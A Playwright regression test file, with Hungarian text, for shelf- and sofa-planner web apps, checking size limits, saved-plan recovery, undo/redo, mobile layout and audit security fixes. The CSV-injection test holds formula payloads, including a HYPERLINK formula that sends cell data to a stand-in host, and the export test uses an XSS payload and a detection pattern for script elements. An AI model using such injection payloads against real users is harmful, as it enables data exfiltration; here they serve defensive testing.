// A független ellenőrzés találatainak regressziós tesztjei.
import { test, expect } from '@playwright/test';
import { openApp, importFile, grabDownload, toast, XSS } from './helpers.mjs';

const enter = async (page, sel, v) => { await page.fill(sel, String(v)); await page.press(sel, 'Enter'); };

test.describe('A szerkesztő nem hozhat létre betölthetetlen tervet (adatvesztés)', () => {
  test('Polcrendező: túl nagy szélesség visszautasítva, újratöltés után a terv megmarad', async ({ page }) => {
    const errors = await openApp(page, 'polcrendezo.html');
    await page.locator('#pr_cv [data-cell]').first().click();
    await page.fill('#cf_name', 'Saját szekrény');
    await enter(page, '#cf_W', 2500);
    await expect(toast(page)).toContainText('visszavonva');
    await expect.poll(() => page.evaluate(() => __bt.S.c.list.find((c) => c.id === __bt.S.c.sel).W)).toBeLessThanOrEqual(2000);
    await page.waitForTimeout(400);
    await page.reload();
    await expect(page.locator('#pr_tabs')).toContainText('Saját szekrény');
    await expect(toast(page)).not.toContainText('hibás');
    expect(errors).toEqual([]);
  });
  test('Polcrendező: 210 tárgy egy rekeszbe visszautasítva', async ({ page }) => {
    await openApp(page, 'polcrendezo.html');
    await page.locator('#pr_cv [data-cell]').first().click();
    const before = await page.evaluate(() => __bt.S.c.list.find((c) => c.id === __bt.S.c.sel).cols[0].rows[0].items.length);
    await enter(page, '#pr_new', Array.from({ length: 210 }, (_, i) => 't' + i).join(';'));
    await expect(toast(page)).toContainText('Túl sok elem');
    expect(await page.evaluate(() => __bt.S.c.list.find((c) => c.id === __bt.S.c.sel).cols[0].rows[0].items.length)).toBe(before);
  });
  test('Polcrendező: túl kicsi magasság ennyi polchoz visszautasítva', async ({ page }) => {
    await openApp(page, 'polcrendezo.html');
    await page.locator('#pr_cv [data-cell]').first().click();
    const H = await page.evaluate(() => __bt.S.c.list.find((c) => c.id === __bt.S.c.sel).H);
    await enter(page, '#cf_H', 10);
    await expect(toast(page)).toContainText('túl kicsi');
    await expect.poll(() => page.evaluate(() => __bt.S.c.list.find((c) => c.id === __bt.S.c.sel).H)).toBe(H);
  });
  test('Kanapé-tervező: túl nagy koordináta a határra áll; 300 elem fölött a másolás visszautasítva; újratöltés után megmarad', async ({ page }) => {
    const errors = await openApp(page, 'kanape.html');
    await page.locator('#kp_list [data-act="pick"]').first().click();
    await page.fill('[data-bk="x"]', '25000');
    await expect(toast(page)).toContainText('tartomány');
    expect(await page.evaluate(() => __bt.S.b.items[0].x)).toBe(20000);
    // a 20 000 cm-en álló elem másolata kilógna: visszautasítva
    expect(await page.evaluate(() => { __bt.act('dup', { dataset: {} }); return __bt.S.b.items.length; })).toBe(6);
    // 299 elem importtal, majd másolás: a 300. még belefér, a 301. már nem
    await importFile(page, '#kp_file', { app: 'kanape', b: { items: Array.from({ length: 299 }, (_, i) => ({ name: 'E' + i, type: 'seat', x: (i % 20) * 100, y: Math.floor(i / 20) * 100, w: 80, h: 80 })) } });
    await expect(toast(page)).toContainText('Betöltve');
    await page.locator('#kp_list [data-act="pick"]').first().click();
    const n = await page.evaluate(() => { __bt.act('dup', { dataset: {} }); __bt.act('dup', { dataset: {} }); return __bt.S.b.items.length; });
    expect(n).toBe(300);
    await expect(toast(page)).toContainText('Túl sok elem');
    await page.waitForTimeout(400);
    await page.reload();
    expect(await page.evaluate(() => __bt.S.b.items.length)).toBe(300);
    await expect(toast(page)).not.toContainText('hibás');
    expect(errors).toEqual([]);
  });
  test('hibás tárolt terv: az eredeti megmarad és a menüből letölthető', async ({ page }) => {
    const raw = JSON.stringify({ c: { list: [{ name: 'Régi', W: 'x' }] } });
    await page.addInitScript((r) => { if (!sessionStorage.done) { sessionStorage.done = 1; localStorage.setItem('pr.state', r); } }, raw);
    await openApp(page, 'polcrendezo.html', { keepStorage: true });
    await expect(toast(page)).toContainText('menüből letölthető');
    await page.locator('#menuBtn').click();
    const dl = await grabDownload(page, () => page.locator('[data-m="bak"]').click());
    expect(dl.buf.toString()).toBe(raw);
  });
});

test('CSV-injektálás: a képletként értelmezhető cellák semlegesítve', async ({ page }) => {
  await openApp(page, 'polcrendezo.html');
  const items = ['=1+1', '+1', '-2', '@SUM(1)', '\tX', '=HYPERLINK("http://x.example/?a="&A1,"Katt")'].map((n) => ({ n, q: '=2' }));
  await importFile(page, '#pr_file', { app: 'polcrendezo', list: [{ name: '=cmd', W: 80, H: 72, D: 35, cols: [{ rows: [{ items }, {}] }] }] });
  await expect(toast(page)).toContainText('Betöltve');
  const { buf } = await grabDownload(page, () => page.evaluate(() => __bt.exportCSV()));
  const cells = buf.toString().slice(1).split('\r\n').slice(1).flatMap((r) => r.split(';'));
  for (const c of cells) expect(c.replace(/^"/, '')).not.toMatch(/^[=+\-@\t]/);
  expect(cells).toContain("'=1+1"); expect(cells).toContain("'=cmd"); expect(cells).toContain("'=2");
});

test('export XSS: a tervlap SVG és a PDF-oldalak nem tartalmaznak futtatható kódot', async ({ page }) => {
  await openApp(page, 'polcrendezo.html');
  await importFile(page, '#pr_file', { app: 'polcrendezo', p: { title: XSS, proj: 'x' }, groups: [{ id: 'g', name: XSS }],
    list: [{ name: XSS, g: 'g', W: 80, H: 72, D: 35, cols: [{ rows: [{ items: [{ n: XSS, q: XSS }] }, {}] }] }] });
  await expect(toast(page)).toContainText('Betöltve');
  await page.locator('nav.side [data-tab="sheet"]').click();
  const svg = await grabDownload(page, () => page.locator('[data-act="svg"]').first().click());
  const bad = await page.evaluate((x) => { const d = new DOMParser().parseFromString(x, 'image/svg+xml');
    return [...d.querySelectorAll('*')].filter((e) => /^(img|script|foreignObject|iframe)$/i.test(e.localName) || [...e.attributes].some((a) => /^on/i.test(a.name))).length; }, svg.buf.toString());
  expect(bad).toBe(0);
  await page.evaluate(() => { window.print = () => {}; __bt.exportPDF(); });
  await expect(page.locator('#rep img, #rep [onerror], #rep [onload]')).toHaveCount(0);
  expect(await page.evaluate(() => window.__xss)).toBeUndefined();
});

test('teljesítmény: korláton belüli legnagyobb import (2000 rekesz) után a panel gyors', async ({ page }) => {
  await openApp(page, 'polcrendezo.html');
  const list = Array.from({ length: 50 }, (_, i) => ({ name: 'Sz' + i, W: 60, H: 200, D: 40, t: 1, cols: [{ rows: Array.from({ length: 40 }, () => ({})) }] }));
  list[0].cols[0].rows[0].items = Array.from({ length: 200 }, (_, i) => ({ n: 't' + i }));
  await importFile(page, '#pr_file', { app: 'polcrendezo', list });
  await expect(toast(page)).toContainText('Betöltve');
  const t0 = Date.now();
  await page.locator('#pr_cv [data-cell]').first().click();
  await expect(page.locator('#pr_props .irow')).toHaveCount(200);
  expect(Date.now() - t0).toBeLessThan(3000);
  await page.locator('select[data-imv]').first().focus();
  expect(await page.locator('select[data-imv]').first().locator('option').count()).toBe(2001);
  // 2001. rekesz már nem fér bele
  list.push({ name: 'X', W: 60, H: 200, D: 40, cols: [{ rows: [{}] }] });
  await importFile(page, '#pr_file', { app: 'polcrendezo', list });
  await expect(toast(page)).toContainText('Túl sok rekesz');
});

test('lakat: a rögzített polcközök nem változnak, ha csak a szerkesztett szabad', async ({ page }) => {
  await openApp(page, 'polcrendezo.html');
  const r = await page.evaluate(() => {
    const a = [{ h: 20, lock: 1 }, { h: 20, lock: 1 }, { h: 30 }]; const st = __bt.fit(a, 'h', 60, 2);
    const b = [{ h: 30, lock: 1 }, { h: 10 }, { h: 10 }]; const st2 = __bt.fit(b, 'h', 20);
    return { a: a.map((x) => x.h), st, st2 };
  });
  expect(r).toEqual({ a: [20, 20, 20], st: 'adj', st2: 'lock' });
});

test('sérült fül-kulcs (pl. „constructor”) nem teszi tönkre az appot', async ({ page }) => {
  for (const [f, k] of [['kanape.html', 'kp.tab'], ['polcrendezo.html', 'pr.tab']]) {
    await page.addInitScript((k) => localStorage.setItem(k, 'constructor'), k);
    const errors = await openApp(page, f, { keepStorage: true });
    await expect(page.locator('#main h1')).toBeVisible();
    expect(errors).toEqual([]);
  }
});

test('import: sortörés/TAB a szövegben szóközzé válik, a „0”/„false” kapcsoló hamis', async ({ page }) => {
  await openApp(page, 'polcrendezo.html');
  await importFile(page, '#pr_file', { app: 'polcrendezo', list: [{ name: 'a\r\nb\tc', fal: 'false', W: 80, H: 72, D: 35, cols: [{ lock: '0', rows: [{ lock: 'false' }, {}] }] }] });
  await expect(toast(page)).toContainText('Betöltve');
  const c = await page.evaluate(() => __bt.S.c.list[0]);
  expect(c.name).toBe('a b c'); expect(c.fal).toBe(0); expect(c.cols[0].lock).toBe(0); expect(c.cols[0].rows[0].lock).toBe(0);
});

test('visszavonás visszaállítja a kijelölést is', async ({ page }) => {
  await openApp(page, 'polcrendezo.html');
  await page.locator('[data-act="pick"]').filter({ hasText: 'Fürdőszoba' }).click();
  const sel = await page.evaluate(() => __bt.S.c.sel);
  page.once('dialog', (d) => d.accept());
  await page.locator('[data-act="cdel"]').click();
  await page.evaluate(() => document.activeElement && document.activeElement.blur());
  await page.keyboard.press('Control+z');
  expect(await page.evaluate(() => __bt.S.c.sel)).toBe(sel);
});

for (const f of ['kanape.html', 'polcrendezo.html', 'index.html']) {
  test(`mobil (390×844): ${f} – nincs oldalirányú görgetés egyik fülön sem`, async ({ browser }) => {
    const ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, isMobile: true, hasTouch: true, deviceScaleFactor: 2 });
    const page = await ctx.newPage();
    if (f === 'index.html') await page.goto(new URL('../' + f, import.meta.url).href); else await openApp(page, f);
    const tabs = await page.locator('#bot [data-tab]').count();
    for (let i = 0; i < Math.max(1, tabs); i++) {
      if (tabs) await page.locator('#bot [data-tab]').nth(i).click();
      const w = await page.evaluate(() => [document.documentElement.scrollWidth, document.documentElement.clientWidth]);
      expect(w[0], `${f} ${i}. fül`).toBeLessThanOrEqual(w[1] + 1);
    }
    await ctx.close();
  });
}

test('Polcrendező: 200 szekrény mellett az új szekrény visszautasítva, az utána tett szerkesztés megmarad', async ({ page }) => {
  const errors = await openApp(page, 'polcrendezo.html');
  const list = Array.from({ length: 200 }, (_, i) => ({ name: 'Sz' + i, W: 60, H: 72, D: 30, cols: [{ rows: [{}, {}] }] }));
  await importFile(page, '#pr_file', { app: 'polcrendezo', list });
  await expect(toast(page)).toContainText('Betöltve');
  await page.selectOption('#pr_add', 'fali:0');
  await expect(toast(page)).toContainText('Túl sok elem');
  expect(await page.evaluate(() => __bt.S.c.list.length)).toBe(200);
  await page.locator('#pr_cv [data-cell]').first().click();
  await page.fill('#cf_name', 'ATNEVEZVE');
  await page.waitForTimeout(400);
  await page.reload();
  await expect(page.locator('#pr_tabs')).toContainText('ATNEVEZVE');
  expect(errors).toEqual([]);
});

test('lakat: a szerkesztett érték a maradék helyre szorul, a rögzített nem változik', async ({ page }) => {
  await openApp(page, 'polcrendezo.html');
  const r = await page.evaluate(() => { const a = [{ h: 20, lock: 1 }, { h: 20 }, { h: 55 }]; const st = __bt.fit(a, 'h', 60, 2); return { a: a.map((x) => x.h), st }; });
  expect(r).toEqual({ a: [20, 3, 37], st: 'adj' });
});

test('visszautasított művelet után az „Újra” lépés megmarad', async ({ page }) => {
  await openApp(page, 'polcrendezo.html');
  await page.locator('#pr_cv [data-cell]').first().click();
  const W0 = await page.evaluate(() => __bt.S.c.list.find((c) => c.id === __bt.S.c.sel).W);
  await enter(page, '#cf_W', W0 + 10);
  await expect.poll(() => page.evaluate(() => __bt.S.c.list.find((c) => c.id === __bt.S.c.sel).W)).toBe(W0 + 10);
  await page.evaluate(() => { document.activeElement.blur(); __bt.undo(); });
  expect(await page.evaluate(() => __bt.S.c.list.find((c) => c.id === __bt.S.c.sel).W)).toBe(W0);
  await page.locator('#pr_cv [data-cell]').first().click();
  await enter(page, '#cf_W', 5000);
  await expect(toast(page)).toContainText('visszavonva');
  await page.evaluate(() => { document.activeElement.blur(); __bt.redo(); });
  expect(await page.evaluate(() => __bt.S.c.list.find((c) => c.id === __bt.S.c.sel).W)).toBe(W0 + 10);
});
